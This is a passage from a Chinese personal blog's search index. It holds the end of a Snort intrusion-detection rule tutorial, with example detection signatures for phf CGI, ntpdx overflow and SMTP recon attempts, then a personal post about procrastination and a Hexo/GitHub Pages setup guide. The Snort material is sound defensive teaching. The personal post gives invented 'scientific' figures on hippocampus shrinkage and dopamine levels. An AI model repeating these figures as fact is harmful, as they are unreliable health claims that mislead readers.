<h4 id="rev"><a href="#rev" class="headerlink" title="&#x3D;&#x3D;rev&#x3D;&#x3D;*"></a><em>&#x3D;&#x3D;rev&#x3D;&#x3D;</em>*</h4><p>rev关键字用于唯一标识Snort规则的修订。修订版本与 Snort 规则 ID 一起允许改进签名和描述并将其替换为更新的信息。<br><code>rev:&lt;revision integer&gt;;</code><br>示例：此示例是Snort规则修订版为1的规则。<br><code>alert tcp any any -&gt; any 80 (content:&quot;BOB&quot;; sid:1000983; rev:1;)</code></p>
<h4 id="classtype"><a href="#classtype" class="headerlink" title="&#x3D;&#x3D;classtype&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;classtype&#x3D;&#x3D;</strong></h4><p>classtype关键字用于将规则分类为检测属于更一般类型的攻击类的攻击。Snort提供了一组默认的攻击类，由它提供的默认规则集使用。为规则定义分类提供了一种更好地组织Snort生成的事件数据的方法。<br><code>classtype:&lt;class name&gt;;</code><br>例如：<br><code>alert tcp any any -&gt; any 25 (msg:&quot;SMTP expn root&quot;; flags:A+; content:&quot;expn root&quot;; nocase; classtype:attempted-recon;)</code><br>Snort定义的攻击分类位于classification.config文件中。该文件使用以下语法：<br><code>config classification:  &lt;class name&gt;,&lt;class description&gt;,&lt;default priority&gt;</code><br><em>classtype 选项只能使用已通过配置分类选项在snort.conf中定义的分类。Snort 在分类.config 中提供了一组默认分类 ，供其提供的规则使用。</em></p>
<h4 id="priority"><a href="#priority" class="headerlink" title="&#x3D;&#x3D;priority&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;priority&#x3D;&#x3D;</strong></h4><p>priority标记为规则分配严重性级别。classtype规则分配默认优先级（由配置分类选项定义），该优先级可以被优先级规则覆盖。每种情况的例子如下。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt; any 80 (msg:&quot;WEB-MISC phf attempt&quot;; flags:A+;content:&quot;/cgi-bin/phf&quot;; priority:10;)  </span><br><span class="line">  </span><br><span class="line">    alert tcp any any -&gt; any 80 (msg:&quot;EXPLOIT ntpdx overflow&quot;;dsize:&gt;128; classtype:attempted-admin; priority:10;)</span><br></pre></td></tr></table></figure></div>
<h4 id="metadata"><a href="#metadata" class="headerlink" title="&#x3D;&#x3D;metadata&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;metadata&#x3D;&#x3D;</strong></h4><p>metadata标记允许规则编写者嵌入有关规则的附加信息，通常采用键-值格式。某些元数据键和值对Snort有意义，并在表中列出。除了表中列出的键之外，Snort实际上会忽略这些键，并且这些键可以是自由格式的，只有一个键和一个值。多个键之间用逗号分隔，而键和值之间用空格分隔。<br>![[3.2 snort-metadata.png]]</p>
<h3 id="2）有效负荷检测规则选项"><a href="#2）有效负荷检测规则选项" class="headerlink" title="2）有效负荷检测规则选项"></a>2）有效负荷检测规则选项</h3><h4 id="content"><a href="#content" class="headerlink" title="&#x3D;&#x3D;content&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;content&#x3D;&#x3D;</strong></h4><p>content关键字是Snort的重要特性之一。它允许用户设置规则，搜索数据包有效载荷中的特定内容，并根据该数据触发响应。如果数据包的有效负载中包含与参数数据字符串完全匹配的数据，则测试成功，并执行其余的规则选项测试。请注意，此测试是区分大小写的。<br>content关键字的选项数据有些复杂;它可以包含混合的文本和二进制数据。二进制数据通常包含在<code>|</code>字符中，并表示为字节码。字节码将二进制数据表示为十六进制数，是描述复杂二进制数据的一种很好的速记方法。下面的示例显示了在Snort规则中混合使用文本和二进制数据。<br><strong>可以在一个规则中指定多个内容规则。这允许规则被定制以减少误报。</strong><br>如果规则前面有a！，将在不包含此内容的数据包上触发警报。这在编写要对不匹配特定模式的数据包发出警报的规则时很有用。<br><code>alert tcp any any -&gt; any 139 (content:&quot;|5c 00|P|00|I|00|P|00|E|00 5c|&quot;;)</code><br><code> alert tcp any any -&gt; any 80 (content:!&quot;GET&quot;;)</code></p>
<h4 id="protected-content"><a href="#protected-content" class="headerlink" title="&#x3D;&#x3D;protected_content&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;protected_content&#x3D;&#x3D;</strong></h4><p><code>protected_content</code>关键字提供了<code>content</code>关键字的大部分功能，但是它的执行和使用方式非常不同。<code>protected_content</code>相对于<code>content</code>的主要优势是protected允许人们通过仅显示目标内容的安全哈希摘要来隐藏所述内容。与content关键字一样，它的主要目的是匹配特定字节的字符串。<br>目前，可以使用MD5、SHA256和SHA512哈希算法与protected_content关键字。如果在Snort配置中未设置默认值，则必须在规则中使用 hash 指定哈希算法。此外，使用protected，必须指定 length 修饰符，以指示原始数据的长度。<br>与<code>content</code>一样，可以在一个规则中使用多个<code>protected_content</code>规则。此外，可以将多个<code>protected_content</code>规则与多个<code>content</code>规则混合使用。<br><strong>如果规则前面有a！，将在不包含目标内容的分组上触发警报。这在编写要对不匹配特定模式的数据包发出警报的规则时很有用。</strong><br>格式：<code>protected_content:[!]&quot;&lt;content hash&gt;&quot;, length:orig_len[, hash:md5|sha256|sha512];</code><br>示例：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert tcp any any &lt;&gt; any 80 (msg:&quot;MD5 Alert&quot;;protected_content:&quot;293C9EA246FF9985DC6F62A650F78986&quot;; hash:md5; offset:0; length:4;)</span><br><span class="line"></span><br><span class="line">alert tcp any any &lt;&gt; any 80 (msg:&quot;SHA256 Alert&quot;; protected_content:&quot;56D6F32151AD8474F40D7B939C2161EE2BBF10023F4AF1DBB3E13260EBDC6342&quot;;hash:sha256; offset:0; length:4;)</span><br></pre></td></tr></table></figure></div>
<h4 id="hash"><a href="#hash" class="headerlink" title="&#x3D;&#x3D;hash&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;hash&#x3D;&#x3D;</strong></h4><p>hash关键字用于指定匹配protected_content规则时使用的哈希算法。如果Snort配置中未指定默认算法，则protected_content规则必须指定所使用的算法。目前支持MD5、SHA256和SHA512。<br>格式：<code> hash:[md5|sha256|sha512]</code></p>
<h4 id="length"><a href="#length" class="headerlink" title="&#x3D;&#x3D;length&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;length&#x3D;&#x3D;</strong></h4><p>length关键字用于指定protected_content规则摘要中指定的内容的原始长度。提供的值必须大于0且小于65536。<br>格式：<code>length:[&lt;original_length&gt;];</code></p>
<h4 id="nocase"><a href="#nocase" class="headerlink" title="&#x3D;&#x3D;nocase&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;nocase&#x3D;&#x3D;</strong></h4><p>指定对content字符串大小写不敏感。</p>
<h4 id="rawbytes"><a href="#rawbytes" class="headerlink" title="&#x3D;&#x3D;rawbytes&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;rawbytes&#x3D;&#x3D;</strong></h4><p>rawbytes关键字允许规则查看原始数据包数据，忽略预处理器完成的任何解码。<br>HTTP Inspect有一组关键字来使用原始数据，例如http_raw_cookie，http_raw_header，http_raw_uri等，它们与原始HTTP请求和响应的特定部分相匹配。如果rawbytes没有明确指定，大多数其他预处理器默认使用解码&#x2F;规范化数据进行内容匹配。因此，应该指定rawbytes，以便检查数据包中的任意原始数据。<br><code>alert tcp any any -&gt; any 21 (msg:&quot;Telnet NOP&quot;; content:&quot;|FF F1|&quot;; rawbytes;)</code><br>这个例子告诉内容模式匹配器查看原始流量，而不是由HTTP解码器提供的解码流量。</p>
<h4 id="depth"><a href="#depth" class="headerlink" title="&#x3D;&#x3D;## depth&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;## depth&#x3D;&#x3D;</strong></h4><p>depth关键字允许规则编写者指定Snort应该在数据包中搜索指定模式的范围。<br>深度为5将告诉Snort只在有效负载的前5个字节内查找指定的payload。由于深度关键字是先前内容关键字的修饰符，因此在指定深度之前规则中必须有内容。<br>此关键字允许值大于或等于正在搜索的模式长度。允许的最小值为1。此关键字允许的最大值为65535。</p>
<h4 id="offset"><a href="#offset" class="headerlink" title="&#x3D;&#x3D;offset&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;offset&#x3D;&#x3D;</strong></h4><p>offset关键字允许规则编写者指定从何处开始搜索数据包中的模式。<br>偏移量5将告诉Snort在payload的前5个字节之后开始查找指定的模式。<br>由于此关键字是前一个内容关键字的修饰符，因此在指定偏移量之前，规则中必须有内容。此关键字允许的值范围为-65535到65535。</p>
<h4 id="distance"><a href="#distance" class="headerlink" title="&#x3D;&#x3D;distance&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;distance&#x3D;&#x3D;</strong></h4><p>distance关键字允许规则编写器指定Snort在开始搜索指定payload之前，应该忽略数据包中相对于前一个payload匹配结束的距离。<br>这可以被认为是与offset完全相同的东西，只不过它是相对于最后一个payload匹配的末尾而不是数据包的开头。<br>例子：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">alert tcp any any -&gt; any any (content:&quot;ABC&quot;;content:&quot;DEF&quot;; distance:1;)</span><br></pre></td></tr></table></figure></div>
<p>上面说的可能难理解，这个规则可以匹配：&#x2F;ABC.{1,}DEF&#x2F;. 一下就知道了哈哈哈。<br>后面的规则字段还有很多，这里只是列举出来了常用的。完整版在这里：<a class="link"   href="http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node32.html" >http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node32.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="四-编写规则，运行Snort"><a href="#四-编写规则，运行Snort" class="headerlink" title="四.编写规则，运行Snort"></a>四.编写规则，运行Snort</h1><p>我们在<code>Snort/etc/</code>文件夹下面可以看到一个配置文件：<code>snort.conf</code>，在这个文件中，指定了规则文件存放路径：<br><code>var RULE_PATH ../rules</code><br>..&#x2F;rules就是说在Snort&#x2F;rules文件夹中，我们到这个文件夹中看一下，有没有这个目录，如果没有的话，自己创建出来。<br>然后，在该文件夹下编写我们自己的规则，然后将规则文件名添加到<br>![[4.1 rules_path.png]]<br>这里的这些应该都是自带的，或者说我们可以从官网中一次性全下载到，但是我这里没有，所以我将这里的所有include的规则文件都删除，然后将我自己的规则文件添加上去：<br>![[4.2 test.rules.png]]<br>到这里，我们就完成了Snort最基本的配置，至于高级用法，后续慢慢学习到之后会更新。<br>最后，使用我们之前学习到的命令，将Snort启动即可。</p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>Snort</tag>
      </tags>
  </entry>
  <entry>
    <title>【觉醒时刻：被偷走的42天生存报告】</title>
    <url>/2025/05/12/%E3%80%90%E8%A7%89%E9%86%92%E6%97%B6%E5%88%BB%EF%BC%9A%E8%A2%AB%E5%81%B7%E8%B5%B0%E7%9A%8442%E5%A4%A9%E7%94%9F%E5%AD%98%E6%8A%A5%E5%91%8A%E3%80%91/</url>
    <content><![CDATA[<p>自从四月份实习结束以来，一直处于摆烂状态，今日为5月12日，持续时间长达一个半月，在这一个半月时间以来，每天都沉谜在游戏当中，在这段时间中，也常常会反思自己，烂在了学生宿舍里面，也活成了曾经我最讨厌的样子。</p>
<h1 id="数据化沉沦（每日实录）"><a href="#数据化沉沦（每日实录）" class="headerlink" title="数据化沉沦（每日实录）"></a>数据化沉沦（每日实录）</h1><ul>
<li>八点多起床已成常态，阳光已穿透积灰的窗帘</li>
<li>每天无心上课，只要没课就窝在宿舍玩游戏，实际游戏也没有赢多少，反而因为游戏导致心态极差</li>
<li>一有碎片化时间，手指自动打开抖音，沉迷在短视频这种低级趣味中</li>
</ul>
<h1 id="堕落基因检测报告​"><a href="#堕落基因检测报告​" class="headerlink" title="堕落基因检测报告​"></a>堕落基因检测报告​</h1><p>⚠️ 成瘾性多巴胺依赖（游戏→即时快感闭环）<br>⚠️ 目标体系崩塌（实习后缺乏新灯塔）<br>⚠️ 环境熵增污染（宿舍成为惰性培养皿）</p>
<h1 id="天赋湮灭进度条（科学警示）"><a href="#天赋湮灭进度条（科学警示）" class="headerlink" title="天赋湮灭进度条（科学警示）"></a>天赋湮灭进度条（科学警示）</h1><ul>
<li>海马体萎缩13%：记忆提取速度下降至备考期68%  </li>
<li>前额叶皮层活性衰减：决策能力退行至初中水平  </li>
<li>多巴胺阈值失控：持续刺激需求超健康值300%</li>
</ul>
<p>回想过去的三年时间，前两年基本都是非常自律，奋进的状态，但是在这次实习结束之后，长达一个月的摆烂，使我感到焦虑。<br>有句话说，摆烂时间太长，上天回收走你的天赋，所以此刻，我将真心做出改变！！！</p>
<h1 id="【涅槃重启协议】"><a href="#【涅槃重启协议】" class="headerlink" title="【涅槃重启协议】"></a>【涅槃重启协议】</h1><p><strong>06:00​</strong>​ 唤醒（手机锁柜至12:00）<br>​<strong>​07:00​</strong>​ 吃早餐<br>​<strong>​08:30​</strong>​ 深度学习3小时<br>​<strong>​14:00​</strong>​ 实战项目攻坚（近期主要为二进制漏洞挖掘）<br>​<strong>​20:00​</strong>​ 嘻嘻，给女朋友打视频，这段时间真的有点冷落她啦</p>
]]></content>
      <categories>
        <category>总结规划</category>
      </categories>
      <tags>
        <tag>总结规划</tag>
      </tags>
  </entry>
  <entry>
    <title>博客搭建/运营指南</title>
    <url>/2025/01/22/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%EF%BC%8C%E8%BF%90%E8%90%A5%E6%8C%87%E5%8D%97/</url>
    <content><![CDATA[<h1 id="一-准备"><a href="#一-准备" class="headerlink" title="一.准备"></a>一.准备</h1><ul>
<li>需要GitHub账号</li>
<li>安装node.js和npm<br>  在<a class="link"   href="https://nodejs.org/en/download/package-manager" >Node官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>下载Node，我使用的安装程序，直接无脑安装就行了，下载完成之后，使用命令<code>node -v</code>看看安装好了没，然后使用命令<code>npm -v</code>再次查看安装成功了没。</li>
<li>安装Git：<br>  在<a class="link"   href="https://git-scm.com/" >Git官网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>安装最新版本，这里如果你不是程序员或者说不想研究git的话装不装无所谓，因为hexo可以一键部署，我当时也不会Git，但是想着学习一下，因为还是很重要的，所以就去学习了，安装成功之后，右键鼠标就会有<code>Open Git Bash here</code>:<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic.imgdb.cn/item/66c89de9d9c307b7e9c7fab4.png"
                      alt="Git"
                ></li>
<li>安装Hexo框架：<br>  主题框架需要借助npm包管理器来安装：  <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">hexo -v</span><br></pre></td></tr></table></figure></div>
  完成之后，用shell进到你想要保存博客所有东西的目录（这里的hexo_blog就是文件夹的名称，该命令会创建一个文件夹，该文件夹保存博客的所有东西）:  <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">hexo init hexo_blog</span><br><span class="line">cd hexo_blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure></div>
至此，我们需要的东西基本上都准备好了。</li>
</ul>
<h1 id="二-搭建博客"><a href="#二-搭建博客" class="headerlink" title="二.搭建博客"></a>二.搭建博客</h1><p>首先我们需要创建一个GitHub项目，需要注意的是，这个项目需要以<code>&lt;用户名&gt;.github.io</code>命名。</p>
<ul>
<li>更换主题：<br>  hexo的默认界面说实话有点小丑，我们可以到<a class="link"   href="https://hexo.io/themes/" >这里<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>选择我们想要的主题，这里我们可以用这种方式下载主题：  <div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd hexo-blog</span><br><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></div>
  如果这种方式有点慢或者说下不下来的话，你可以直接到主题的GitHub页面把项目全部下载下来，然后保存到<code>themes/next</code>目录下，完成之后修改博客根目录下的<code>_config.yml</code>:  <div class="code-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">redefine</span></span><br></pre></td></tr></table></figure></div>
  好了，现在你可以使用命令<code>hexo g</code>,<code>hexo s</code>，正常启动之后在浏览器使用<code>localhost:4000</code>查看是否搭建成功。如果本地没有问题的话，就可以上传到github了<br>  这里需要注意，只需要上传public目录就可以了，我当时学习搭建的时候没有看到，直接把博客的根目录传上去了，折腾了好久</li>
</ul>
<p>其实每个主题都是有官方文档的，可以看着文档自己diy一下。<br>完成这些之后，你就可以上传到GitHub了：</p>
<ul>
<li>方法一（使用Git）：<br>  首先Open Git Bash here</li>
</ul>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git init -b main</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;Fitst commit&quot; #提交信息</span><br><span class="line">git remote add origin https://github.com/Shad0hun/Shad0hun.github.io.git</span><br><span class="line">git remote -v #验证远程仓库</span><br><span class="line">git push origin main</span><br></pre></td></tr></table></figure></div>
<p>如果你使用https上传不了的话，建议多试几次，或者使用ssh上传。</p>
<ul>
<li>方法二（一键部署）：<br>  这个方法需要我们修改<code>_config.yml</code>：</li>
</ul>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Deployment</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Docs: https://hexo.io/docs/one-command-deployment</span></span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https://github.com/Shad0hun/Shad0hun.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure></div>
<p>这里如果不想用shh，一定要安装插件：<br><code> npm install hexo-deployer-git --save</code><br>然后使用命令<code>hexo d</code>一键部署，如果不成功的话，还是建议多试几次或者将https改为ssh进行上传。<br>完成上面的工作，实际上我们已经可以在自己的网站上看到博客了，如果看不到的话，去看看GitHub Pages有没有正常工作。</p>
<h1 id="三-博客运营"><a href="#三-博客运营" class="headerlink" title="三.博客运营"></a>三.博客运营</h1><p>修改<code>_config.yml</code>文件：<code>post_asset_folder: true</code>即可在生成文章的时候生成一个同名资源目录用于存放图片文件。<br>这里主要介绍hexo的一些指令，主要就是发布文章，同步到GitHub的一些操作。</p>
<ul>
<li>新建博客并初始化：<code>hexo init [folder]</code></li>
<li>新建文章：<code>hexo new [layout] &lt;title&gt;</code></li>
<li>生成静态文件：<code>hexo generate</code>，这实际上就是把我们的.md文件生成为html文件</li>
<li>发布草稿：<code>hexo publish [layout] &lt;filename&gt;</code></li>
<li>部署网站：<code>hexo deploy</code></li>
<li>清理缓存文件：<code>hexo clean</code></li>
<li>获取配置：<code>hexo config</code></li>
<li>将草稿帖子从 _drafts 移动到 _posts 文件夹：<code>hexo publish</code><br>这里再来说一下文章标签：<blockquote>
<p>title:网页文章标题<br>date:文章创建如期<br>comments:文章评论功能是否启动<br>tags:文章标签<br>categories:文章分类<br>keywords:文章关键字</p>
</blockquote>
</li>
</ul>
<p>最后，附上参考播客：<a class="link"   href="https://blog.csdn.net/yaorongke/article/details/119089190" >GitHub Pages + Hexo搭建个人博客网站，史上最全教程<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
  </entry>
</search>
